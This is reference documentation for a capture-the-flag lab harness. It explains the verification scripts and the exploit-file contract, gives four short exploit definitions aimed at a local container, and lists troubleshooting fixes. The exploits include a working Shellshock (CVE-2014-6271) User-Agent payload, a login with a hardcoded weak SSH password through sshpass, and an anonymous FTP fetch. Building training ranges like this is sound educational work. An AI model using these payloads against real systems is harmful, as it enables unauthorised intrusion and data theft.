# Verification System Reference

Documents `agent-harness/verify.sh`, `agent-harness/verify-all.sh`, and the exploit file
contract. All content is taken from the actual scripts and working exploit definitions.

---

## verify.sh Workflow

```
Usage: agent-harness/verify.sh <game-name>
```

What it does, in order:

1. Validates that `games/<name>/setup.yml` exists
2. Validates that `agent-harness/exploits/<name>.exploit` exists
3. Checks required tools are available: `ansible-playbook docker curl sshpass nc grep timeout`
4. Sources the `.exploit` file; validates `GAME_TITLE`, `EXPECTED_FLAG`, `run_exploit()` are set
5. Runs `ansible-playbook -i inventory/hosts.ini games/<name>/setup.yml` with a 600s timeout
6. Parses the Ansible recap for `ok=`, `changed=`, `failed=`, `unreachable=`
7. If deployment succeeded, runs `run_exploit()` via `timeout <EXPLOIT_TIMEOUT> bash -c 'run_exploit'`
8. Checks exploit exit code (must be 0)
9. Checks that `EXPECTED_FLAG` appears in the exploit stdout (grep -F)
10. Prints a summary block and appends to `research-logs/verification-log.md`
11. Exits 0 only if ALL THREE pass: deployment OK + exploit exit 0 + flag found in output

**A PASS requires exit code 0 from verify.sh. Never claim PASS based on output text alone.**

### Exit codes
- `0` — full PASS (deploy OK, exploit exit 0, flag retrieved)
- `1` — FAIL (any condition failed)
- `2` — usage error or missing files/tools

### Environment overrides
```bash
DEPLOY_TIMEOUT=600      # seconds for ansible-playbook (default 600)
EXPLOIT_TIMEOUT=30      # seconds for the exploit (default 30)
TARGET_HOST=127.0.0.1   # host the exploit connects to
TARGET_SSH_PORT=2222    # SSH port
TARGET_HTTP_PORT=80     # HTTP port
TARGET_BANNER_PORT=8888 # custom banner port
```

---

## verify-all.sh Workflow

```
Usage: agent-harness/verify-all.sh
```

Discovers all games automatically: any directory under `games/` with a `setup.yml` is
treated as a game. Runs `verify.sh` for each one sequentially. Prints a summary table.
Exits 0 only if every game passed; exits 1 if any failed.

No game names are hardcoded. Adding a new game directory with `setup.yml` and a matching
`.exploit` file is all that's needed.

---

## Exploit File Contract

Every `agent-harness/exploits/<name>.exploit` file must declare exactly three things:

```bash
GAME_TITLE="Human readable name"       # shown in output and the log
EXPECTED_FLAG="WMG{exact_flag_value}"  # exact string that must appear in stdout
run_exploit() {
  # Runs the real exploit. Prints retrieved content to stdout.
  # Returns 0 if the exploit MECHANISM succeeded.
  # The flag match is checked separately by verify.sh.
}
```

`verify.sh` sources the file (not executes it), so the file is a bash fragment, not a script.
No shebang needed, but one won't hurt.

Available environment variables (set by verify.sh with defaults):
- `TARGET_HOST` (default `127.0.0.1`)
- `TARGET_SSH_PORT` (default `2222`)
- `TARGET_HTTP_PORT` (default `80`)
- `TARGET_BANNER_PORT` (default `8888`)
- `EXPLOIT_TIMEOUT` (default `30`)

---

## Four Working Exploit Examples

### ssh-weak-password
```bash
GAME_TITLE="SSH Weak Password"
EXPECTED_FLAG="WMG{ssh_w3ak_p4ssw0rds_are_never_ok}"

run_exploit() {
  sshpass -p password123 ssh -T \
    -p "${TARGET_SSH_PORT:-2222}" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=10 \
    -o BatchMode=no \
    "student@${TARGET_HOST:-127.0.0.1}" \
    "cat ~/flag.txt"
}
```

### shellshock
```bash
GAME_TITLE="Shellshock (CVE-2014-6271)"
EXPECTED_FLAG="WMG{sh3llsh0ck_cve_2014_6271_env_vars_are_scary}"

run_exploit() {
  curl -s --fail --max-time "${EXPLOIT_TIMEOUT:-30}" \
    -H 'User-Agent: () { :; }; echo; /bin/cat /opt/flag.txt' \
    "http://${TARGET_HOST:-127.0.0.1}:${TARGET_HTTP_PORT:-80}/cgi-bin/status.cgi"
}
```

### network-recon
```bash
GAME_TITLE="Network Reconnaissance"
EXPECTED_FLAG="WMG{r3c0n_1s_m0r3_th4n_just_p0rt_sc4nning}"

run_exploit() {
  echo | nc -w3 "${TARGET_HOST:-127.0.0.1}" "${TARGET_BANNER_PORT:-8888}"
}
```

### ftp-anon
```bash
GAME_TITLE="Anonymous FTP Access"
EXPECTED_FLAG="WMG{anon_ftp_1s_a_s3curity_r1sk}"

run_exploit() {
  curl -s --fail \
    --connect-timeout 10 \
    --max-time "${EXPLOIT_TIMEOUT:-30}" \
    "ftp://${TARGET_HOST:-127.0.0.1}:${TARGET_FTP_PORT:-21}/pub/flag.txt"
}
```

---

## Writing a New Exploit Definition

1. Identify the exact command that retrieves the flag (test it manually first)
2. Create `agent-harness/exploits/<game-name>.exploit`
3. Set `GAME_TITLE`, `EXPECTED_FLAG`, and define `run_exploit()`
4. Use `${TARGET_HOST:-127.0.0.1}` and the appropriate port variable
5. Make sure the exploit prints the flag string to stdout on success
6. Make sure the exploit exits 0 on success and non-zero on failure

**The exploit must work from the attacker container or directly from the host.** It runs as
a bare bash function inside verify.sh — no shebang, no subprocess wrapper.

---

## Common Failure Modes and Fixes

### Apache serving 403 or CGI not executing
**Cause:** Apache was started before `a2enmod cgi` / `a2enconf serve-cgi-bin` took effect.
**Fix:** Add an unconditional `service: name=apache2 state=restarted` task at the end of the
play, after all mod/conf tasks. The restart must happen even on a second run. See
`ansible-conventions.md` for the full pattern.

### vsftpd: "broken: not found: directory given in secure_chroot_dir"
**Cause:** `/var/run/vsftpd/empty` does not exist (no systemd to create it).
**Fix:** Add an `ansible.builtin.file: path=/var/run/vsftpd/empty state=directory` task
before starting vsftpd.

### Exploit times out (exit 124)
**Cause:** Service is not listening on the expected port. The `wait_for` in the playbook
may have passed but the service died immediately after.
**Fix:** Increase `EXPLOIT_TIMEOUT` or add `wait_for: port=N timeout=30` to the playbook.
For vsftpd/banner services, verify the `async` fire-and-forget task ran.

### SSH exploit: "Permission denied (publickey)"
**Cause:** PasswordAuthentication is disabled or `sshpass` is not installed.
**Fix:** Add `PasswordAuthentication yes` to sshd_config via `lineinfile`. Ensure `sshpass`
is available on the host running verify.sh.

### Flag not found in exploit output (exploit exits 0 but PASS fails)
**Cause:** The exploit connected but the flag file content differs (path wrong, or file not
planted, or wrong content).
**Fix:** Check `EXPECTED_FLAG` exactly matches `flag_content` in the playbook vars. Check the
flag file path in the exploit matches the `dest:` in the `copy` task. Run the exploit command
manually to inspect actual output.

### Deployment: `failed=1` or `unreachable=1`
**Cause:** Docker container not running, or Python not available on target.
**Fix:** Check `docker ps` to confirm `cyberrange-target` is running. Check
`inventory/hosts.ini` for `ansible_python_interpreter=/usr/bin/python3`.

### `creates:` guard prevents re-running a task that failed partway through
**Cause:** A file was partially created before the task failed, so `creates:` skips it.
**Fix:** Remove the partial file on the target manually, or use `ansible.builtin.file:
state=absent` in a setup task.

---

## Verification Log

Every `verify.sh` run appends to `research-logs/verification-log.md`. The log is append-only
and records: game title, deployment stats, exploit verdict, flag retrieved (Yes/No),
overall verdict, duration, and timestamp. It is never overwritten.
